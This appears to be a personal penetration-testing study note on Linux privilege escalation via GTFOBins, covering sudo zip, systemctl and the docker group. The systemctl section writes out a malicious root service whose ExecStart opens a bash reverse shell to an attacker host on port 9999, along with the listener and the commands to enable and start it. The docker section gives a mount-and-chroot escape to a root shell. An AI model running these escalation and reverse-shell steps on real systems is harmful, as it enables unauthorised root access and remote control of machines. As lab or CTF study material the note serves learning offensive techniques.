GTFOBins is a curated list of Unix binaries that can be *used to bypass local security restrictions* in misconfigured systems.

---
# zip
Here, There Is Command Called *sudo -l*, When You Type It Shows This :-
![[Pasted image 20220810163817.png]]

This Means That *We Can Run The zip command while using sudo,* **Only The zip Command!**

Go On This Website : [GTFOBins](https://gtfobins.github.io/)

Search For The *Command You Wanna Escalate Your Privilges On*. In This Case <u>sudo zip</u>.

Run These Commands Below And *Get The Root Access! (Actually Only The First 2 Would Do It)*
![[Pasted image 20220810164206.png]]

---
# systemctl
1) Prepare your payload `root.service`

```sh
[Unit]
Description=roooooooooot

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/[KaliIP]/9999 0>&1'

[Install]
WantedBy=multi-user.target
```

2) Find Writeable Files/Directories
```sh
find / -writable -type f 2>/dev/null
find / -writable -type d 2>/dev/null
```

3) Transfer the `root.service` Payload
	- By Writing There using *vim editor*
	- Transfer using [[Netcat & Ncat]]

4) Start listening on port **9999**
```sh
nc -lvnp 9999
```

5) Execute the Payload (Assume file is in */tmp* Directory)
```sh
systemctl enable /tmp/root.service

# Output
Created symlink from /etc/systemd/system/multi-user.target.wants/root.service to /dev/shm/root.service
Created symlink from /etc/systemd/system/root.service -> /dev/shm/root.service
```

```sh
systemctl start root
```

---
# Docker
If user is `root` or in `docker` group :-
![[Pasted image 20231014234455.png]]

Check for installed **Docker images** in the system
```sh
docker image ls
```
```sh
docker run -v /:/mnt --rm -it [image_name] chroot /mnt sh
```
Here we have created a new docker container from image alpine, mounted the root filesystem to `/mnt`, started the docker container in interactive mode which will give us a shell to work with, changed the root to `/mnt` and finally told to delete the container upon exiting.